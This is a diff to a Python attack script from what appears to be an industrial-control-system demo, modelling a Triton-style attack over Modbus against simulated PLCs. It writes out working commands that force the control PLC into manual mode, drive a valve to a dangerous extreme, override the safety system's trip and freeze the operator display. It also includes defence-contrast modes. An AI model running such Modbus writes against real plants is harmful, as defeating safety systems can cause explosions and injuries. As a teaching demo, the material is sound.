@@ -1,35 +1,41 @@
 """Standalone external attacker — over Modbus, across the two PLCs.
 
 This is the demo's attacker: a separate process that reaches the plant ONLY
-over the Modbus network (exactly what the HMI and bridge use) and drives the
-process to failure with two writes:
+over the Modbus network (exactly what the HMI and bridge use). The BPCS now
+clamps an out-of-range operator setpoint, so the old off-scale-setpoint trick no
+longer saturates the actuator. The evolved attack therefore drives the actuator
+directly through MANUAL mode, and three contrasting modes are demonstrable:
 
-  1. **Control-setpoint manipulation (the driver).** Write a malicious operating
-     SETPOINT to the Control PLC (BPCS, %MW1). The BPCS control loop obediently
-     drives its actuator to chase that setpoint — feed valves wide open, or the
-     reactor's coolant valve shut — pushing the true process variable toward the
-     failure threshold. With no attacker this setpoint stays at the operator's
-     safe value and the process simply runs at baseline forever.
+  1. **Full attack (default).** Flip the BPCS to MANUAL (MAN_MODE) and drive
+     MAN_OUT to the dangerous extreme (feed valve wide open, or the reactor's
+     coolant valve shut) — this bypasses both the control law and the setpoint
+     clamp — AND set SIS_OVERRIDE on the Safety PLC, which suppresses the trip
+     and freezes the operator's HMI at its last nominal value. The process runs
+     past failure while the HMI stays green.
 
-  2. **Safety defeat + HMI spoof.** Set the SIS_OVERRIDE coil on the Safety PLC
-     (SIS). Step 1 alone would be caught by a healthy SIS (it trips and holds
-     the process safe); the override suppresses that trip AND freezes the
-     operator's HMI display at its last nominal value. Now the manipulated
-     setpoint runs the process past failure while the HMI stays green.
+  2. **Manual drive, SIS left armed (``--no-bypass``).** Same manual drive, but
+     the SIS is NOT bypassed — the defence-in-depth contrast, where a healthy
+     SIS trips and holds the process safe despite the manual actuator demand.
 
-This is the Triton attack PATTERN expressed over Modbus (manipulate the control
-setpoint + force-override the safety logic), NOT Triton's TriStation/Triconex
+  3. **Setpoint tamper only (``--setpoint-only``).** Write an off-scale SETPOINT
+     and nothing else. The BPCS clamps it to SP_HI and annunciates SP_CLAMPED;
+     the process settles at the clamp (below trip for tank/vessel) — i.e. the
+     naive attack is neutralised. (The reactor's exotherm still reaches its trip
+     even at the clamp, so there its healthy SIS catches it instead.)
+
+This is the Triton attack PATTERN expressed over Modbus (seize the control
+actuator + force-override the safety logic), NOT Triton's TriStation/Triconex
 program-injection MECHANISM — see OVERVIEW.md.
 
 Usage (needs the venv + both PLCs reachable and RUNNING the scenario):
-    .venv/bin/python -m attack.attack [tank|vessel|reactor]            # launch
-    .venv/bin/python -m attack.attack [tank|vessel|reactor] --reset    # stand down
-    .venv/bin/python -m attack.attack reactor --setpoint-only          # no SIS defeat
+    .venv/bin/python -m attack.attack [tank|vessel|reactor]              # full attack
+    .venv/bin/python -m attack.attack [tank|vessel|reactor] --no-bypass  # SIS armed
+    .venv/bin/python -m attack.attack [tank|vessel|reactor] --setpoint-only
+    .venv/bin/python -m attack.attack [tank|vessel|reactor] --reset      # stand down
 
-``--setpoint-only`` performs step 1 but not step 2, to show the healthy SIS
-catching the manipulation (a useful "defense worked" contrast). The latched trip
-and the override only clear on a runtime restart / this script's ``--reset``
-(see plc/load_program.py --restart, or the dashboard's Reset button).
+``--reset`` returns to AUTO at the safe setpoint, clears the bypass, and pulses
+the SIS RESET pushbutton to clear a latched trip (the reset only takes once the
+PV has fallen a deadband below the trip; see plc/sis/sis.st).
 """
 
 from __future__ import annotations
@@ -46,6 +52,7 @@ def main() -> None:
     args = [a for a in sys.argv[1:]]
     reset = "--reset" in args
     setpoint_only = "--setpoint-only" in args
+    no_bypass = "--no-bypass" in args
     positional = [a for a in args if not a.startswith("--")]
     sid = positional[0] if positional else \
         os.environ.get("PETROTWIN_SCENARIO", scenarios.DEFAULT_SCENARIO)
@@ -55,30 +62,43 @@ def main() -> None:
     sis = ModbusPlc.for_instance(R.Instance.SIS)
     try:
         if reset:
+            bpcs.write_coil(R.BpcsCoil.MAN_MODE, False)
             bpcs.write_holding(R.BpcsHolding.SETPOINT, sc.setpoint_reg)
             sis.write_coil(R.SisCoil.OVERRIDE, False)
+            sis.write_coil(R.SisCoil.RESET, True)   # pulse the reset pushbutton
+            sis.write_coil(R.SisCoil.RESET, False)
             sp = sc.reg_to_pv(bpcs.read_holding(R.BpcsHolding.SETPOINT))
-            print(f"STAND DOWN [{sc.id}]: setpoint restored to {sp:g} {sc.pv_units}, "
-                  f"SIS_OVERRIDE cleared. Baseline control resumes next scan.")
+            print(f"STAND DOWN [{sc.id}]: AUTO restored at {sp:g} {sc.pv_units}, "
+                  f"SIS_OVERRIDE cleared, RESET pulsed. Baseline control resumes "
+                  "next scan (trip clears once PV is back below the deadband).")
             return
-
-        # Step 1 — manipulate the control setpoint (the attack driver).
-        bpcs.write_holding(R.BpcsHolding.SETPOINT, sc.attack_setpoint_reg)
-        sp = sc.reg_to_pv(bpcs.read_holding(R.BpcsHolding.SETPOINT))
-        print(f"ATTACK [{sc.id}]: BPCS setpoint forced to {sp:g} {sc.pv_units} "
-              f"(safe is {sc.setpoint:g}) — the {sc.actuator} is driven to "
-              f"push {sc.pv_name} toward {sc.failure_word}.")
 
         if setpoint_only:
-            print("  --setpoint-only: SIS left ARMED. A healthy SIS should trip "
-                  f"at {sc.trip_hh:g} {sc.pv_units} and hold the process safe.")
+            bpcs.write_holding(R.BpcsHolding.SETPOINT, sc.attack_setpoint_reg)
+            print(f"SETPOINT TAMPER [{sc.id}]: BPCS setpoint forced off-scale — "
+                  f"the BPCS clamps it to {sc.sp_hi:g} {sc.pv_units} (SP_CLAMPED). "
+                  "The naive setpoint attack is neutralised; the process settles "
+                  "at the clamp (the reactor still trips its healthy SIS).")
             return
 
-        # Step 2 — defeat the safety layer and freeze the operator's view.
+        # Evolved driver — seize the actuator through MANUAL mode.
+        bpcs.write_coil(R.BpcsCoil.MAN_MODE, True)
+        bpcs.write_holding(R.BpcsHolding.MAN_OUT, sc.attack_manual_out_reg)
+        pm = sc.attack_manual_out_reg
+        print(f"ATTACK [{sc.id}]: BPCS forced to MANUAL, {sc.actuator} driven to "
+              f"{pm/10:g}% — pushing {sc.pv_name} toward {sc.failure_word} "
+              "(bypasses the control law and the setpoint clamp).")
+
+        if no_bypass:
+            print("  --no-bypass: SIS left ARMED. A healthy SIS should trip at "
+                  f"{sc.trip_hh:g} {sc.pv_units} and hold the process safe.")
+            return
+
+        # Defeat the safety layer and freeze the operator's view.
         sis.write_coil(R.SisCoil.OVERRIDE, True)
         ov = sis.read_coil(R.SisCoil.OVERRIDE)
         print(f"  SIS_OVERRIDE set (override={ov}): trip suppressed, HMI frozen "
-              "at its last nominal value.")
+              "at its last nominal value (BYPASS ACTIVE annunciates).")
         print("  The HMI stays green; watch the 3D ground truth run to "
               f"{sc.failure_word}.")
     finally:
